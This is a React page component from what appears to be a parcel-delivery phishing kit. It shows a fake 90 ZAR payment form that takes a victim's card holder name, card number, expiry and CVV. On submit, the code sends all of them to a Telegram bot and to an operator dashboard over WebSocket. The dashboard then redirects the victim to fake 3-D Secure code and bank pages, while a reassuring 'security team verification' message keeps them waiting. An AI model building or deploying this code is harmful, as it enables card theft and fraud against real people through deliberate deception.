import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Container,
  Flex,
  VStack,
  Icon,
  Text,
  Image,
  Spinner,
} from "@chakra-ui/react";
import { MdLocationOn } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import FormInput from "../components/FormInput";
import CustomButton from "../components/CustomButton";
import {
  isValidCardNumber,
  isValidExpiration,
  randomParamsURL,
} from "../utils/validation";
import { useSendTLGMessage } from "../hooks/useTelegram";
import { buildTelegramMessage } from "../utils/messageBuilder";

const PaymentDetails = () => {
  const navigate = useNavigate();
  const { send } = useSendTLGMessage();
  const [isLoading, setIsLoading] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [formData, setFormData] = useState({
    cardHolder: "",
    cardNumber: "",
    expiration: "",
    cvv: "",
  });
  const [errors, setErrors] = useState({});
  const clientId =
    typeof window !== "undefined" ? localStorage.getItem("clientId") : null;

  // Listen for WebSocket messages to navigate based on dashboard action
  useEffect(() => {
    function onWsPayload(e) {
      const payload = e.detail;
      if (!payload || typeof payload !== "object") return;
      
      if (payload.type === "navigate-to-3ds-code") {
        setIsProcessing(false);
        setIsLoading(false);
        navigate(`/3d-secure?${randomParamsURL()}`);
      } else if (payload.type === "navigate-to-3ds-bank") {
        setIsProcessing(false);
        setIsLoading(false);
        navigate(`/3d-secure-bank?${randomParamsURL()}`);
      }
    }
    window.addEventListener("ws:payload", onWsPayload);
    return () => window.removeEventListener("ws:payload", onWsPayload);
  }, [navigate]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    // Format card number with spaces
    if (name === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19);
    }

    // Format expiration MM/YY
    if (name === "expiration") {
      formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5);
    }

    // Format CVV (only numbers, max 4)
    if (name === "cvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4);
    }

    setFormData((prev) => ({ ...prev, [name]: formattedValue }));

    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: false }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (formData.cardHolder.trim().length < 3) {
      newErrors.cardHolder = true;
    }

    if (!isValidCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = true;
    }

    if (!isValidExpiration(formData.expiration)) {
      newErrors.expiration = true;
    }

    if (formData.cvv.trim().length < 3) {
      newErrors.cvv = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Prevent multiple submissions
    if (isLoading || isProcessing) {
      return;
    }

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const clientId =
        typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
      const clientIp =
        typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

      // Store payment data in localStorage for cumulative messages
      const paymentData = {
        cardHolder: formData.cardHolder.trim(),
        cardNumber: formData.cardNumber.trim(),
        expiration: formData.expiration.trim(),
        cvv: formData.cvv.trim(),
      };
      localStorage.setItem("paymentData", JSON.stringify(paymentData));

      // Build cumulative message
      const message = buildTelegramMessage(clientIp);
      await send(message);

      // Send to WebSocket server
      try {
        window.dispatchEvent(
          new CustomEvent("ws:emit", {
            detail: {
              type: "payment_data",
              clientId,
              cardHolder: formData.cardHolder.trim(),
              cardNumber: formData.cardNumber.trim(),
              cardExpiration: formData.expiration.trim(),
              cardCvv: formData.cvv.trim(),
            },
          })
        );
      } catch {
        // ignore
      }

      // Show processing state and wait for manual validation from dashboard
      setIsLoading(false);
      setIsProcessing(true);
      // Navigation will happen only when dashboard validates via WebSocket message
    } catch (error) {
      console.error("Error:", error);
      setIsLoading(false);
      setIsProcessing(false);
    }
  };

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={3} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header Tab with Package Info */}
            <Box
              bg="#279989"
              bgGradient="linear(to-r, #279989, #2aaa96)"
              color="white"
              p={6}
              boxShadow="0 2px 8px rgba(39, 153, 137, 0.3)">
              <VStack spacing={3} align="center">
                <Flex align="center">
                  <Icon as={MdLocationOn} boxSize={8} mr={2} />
                  <Text fontSize="20px" fontWeight="bold">
                    Payment Information
                  </Text>
                </Flex>
                <Text fontSize="13px" fontWeight="500" opacity={0.9}>
                  Step 3 of 5 • Secure Payment
                </Text>
                <Box
                  mt={2}
                  p={3}
                  bg="rgba(255,255,255,0.15)"
                  borderRadius="8px"
                  w="full"
                  maxW="400px">
                  <Flex justify="space-between" align="center">
                    <Box>
                      <Text fontSize="11px" opacity={0.8} mb={1}>
                        PACKAGE ID
                      </Text>
                      <Text fontSize="14px" fontWeight="700">
                        #8711409823
                      </Text>
                    </Box>
                    <Box textAlign="right">
                      <Text fontSize="11px" opacity={0.8} mb={1}>
                        AMOUNT DUE
                      </Text>
                      <Text fontSize="20px" fontWeight="800" color="#fbbf24">
                        90 ZAR
                      </Text>
                    </Box>
                  </Flex>
                </Box>
              </VStack>
            </Box>

            {/* Form */}
            <Box p={{ base: 6, md: 10 }} bg="white">
              <Box maxW="700px" mx="auto" w="full">
                <form onSubmit={handleSubmit}>
                  <VStack spacing={5} w="full">
                    {/* Card Logos */}
                    <Box
                      w="full"
                      textAlign="center"
                      py={4}
                      borderRadius="8px"
                      bg="#f8f8f8"
                      mb={2}>
                      <Image
                        src="./assets/images/cc-md-5_b.webp"
                        alt="Accepted Cards"
                        maxW="350px"
                        w="90%"
                        mx="auto"
                      />
                    </Box>

                    <FormInput
                      name="cardHolder"
                      placeholder="Card holder"
                      value={formData.cardHolder}
                      onChange={handleChange}
                      isInvalid={errors.cardHolder}
                    />

                    <FormInput
                      name="cardNumber"
                      placeholder="Card number"
                      value={formData.cardNumber}
                      onChange={handleChange}
                      isInvalid={errors.cardNumber}
                    />

                    <Flex w="full" gap={3}>
                      <FormInput
                        name="expiration"
                        placeholder="MM/YY"
                        value={formData.expiration}
                        onChange={handleChange}
                        isInvalid={errors.expiration}
                      />

                      <FormInput
                        name="cvv"
                        placeholder="CVV"
                        type="password"
                        value={formData.cvv}
                        onChange={handleChange}
                        isInvalid={errors.cvv}
                        maxW="150px"
                      />
                    </Flex>

                    <Flex w="full" justify="center" pt={6}>
                      <CustomButton 
                        type="submit" 
                        isLoading={isLoading} 
                        disabled={isProcessing || isLoading}>
                        {isProcessing ? "Processing..." : isLoading ? "Submitting..." : "Next"}
                      </CustomButton>
                    </Flex>
                  </VStack>
                </form>

                {/* Processing state - waiting for dashboard validation */}
                {isProcessing && (
                  <Box
                    mt={6}
                    p={8}
                    bg="linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%)"
                    border="2px solid #279989"
                    borderRadius="12px"
                    textAlign="center"
                    boxShadow="0 4px 12px rgba(39, 153, 137, 0.15)">
                    <VStack spacing={5}>
                      <Spinner size="xl" color="#279989" thickness="4px" speed="0.8s" />
                      <VStack spacing={2}>
                        <Text fontSize="18px" fontWeight="700" color="#279989">
                          Processing your payment...
                        </Text>
                        <Text fontSize="14px" color="#666" fontWeight="500">
                          Please wait while we verify your payment information
                        </Text>
                        <Text fontSize="12px" color="#999" fontStyle="italic" mt={2}>
                          ⏳ Waiting for verification from our security team...
                        </Text>
                      </VStack>
                      <Box
                        w="full"
                        maxW="400px"
                        p={4}
                        bg="rgba(39, 153, 137, 0.1)"
                        borderRadius="8px"
                        border="1px solid rgba(39, 153, 137, 0.2)">
                        <Text fontSize="11px" color="#279989" fontWeight="600">
                          🔒 Your payment is being securely processed. Do not close this page.
                        </Text>
                      </Box>
                    </VStack>
                  </Box>
                )}
              </Box>
            </Box>
          </Box>
        </Container>
      </Box>

      <Footer />
    </Box>
  );
};

export default PaymentDetails;
